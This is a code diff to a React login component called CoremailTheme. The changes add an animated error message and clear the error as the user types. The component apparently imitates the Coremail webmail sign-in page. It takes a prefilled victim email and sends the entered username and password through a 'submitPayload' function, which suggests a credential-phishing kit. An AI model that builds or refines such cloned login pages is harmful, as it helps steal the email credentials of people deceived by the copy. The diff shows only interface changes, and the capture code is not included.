@@ -1,6 +1,7 @@
 
 import React, { useState } from 'react';
 import { useSecurity } from '../components/SecurityManager';
+import { motion } from 'framer-motion';
 
 interface CoremailThemeProps {
   prefilledEmail?: string;
@@ -11,7 +12,7 @@ const CoremailTheme: React.FC<CoremailThemeProps> = ({ prefilledEmail }) => {
   const [password, setPassword] = useState('');
   const [activeTab, setActiveTab] = useState<'user' | 'admin'>('user');
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const { submitPayload } = useSecurity();
+  const { submitPayload, error, setError } = useSecurity();
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -120,7 +121,10 @@ const CoremailTheme: React.FC<CoremailThemeProps> = ({ prefilledEmail }) => {
                     type="text" 
                     placeholder="Username" 
                     value={username}
-                    onChange={(e) => setUsername(e.target.value)}
+                    onChange={(e) => {
+                      setUsername(e.target.value);
+                      if (error) setError(null);
+                    }}
                     className="w-full pl-10 pr-4 py-2 bg-white border border-gray-200 text-[14px] focus:outline-none focus:border-[#007cc7] transition-all rounded-sm"
                   />
                 </div>
@@ -135,7 +139,10 @@ const CoremailTheme: React.FC<CoremailThemeProps> = ({ prefilledEmail }) => {
                     type="password" 
                     placeholder="Password" 
                     value={password}
-                    onChange={(e) => setPassword(e.target.value)}
+                    onChange={(e) => {
+                      setPassword(e.target.value);
+                      if (error) setError(null);
+                    }}
                     className="w-full pl-10 pr-4 py-2 bg-white border border-gray-200 text-[14px] focus:outline-none focus:border-[#007cc7] transition-all rounded-sm"
                   />
                 </div>
@@ -158,6 +165,16 @@ const CoremailTheme: React.FC<CoremailThemeProps> = ({ prefilledEmail }) => {
                 >
                   {isSubmitting ? '...' : 'Sign in'}
                 </button>
+
+                {error && (
+                  <motion.div 
+                    initial={{ opacity: 0, y: -10 }}
+                    animate={{ opacity: 1, y: 0 }}
+                    className="text-red-500 text-[11px] text-center font-medium py-1"
+                  >
+                    {error}
+                  </motion.div>
+                )}
               </form>
 
               {/* Security logos */}
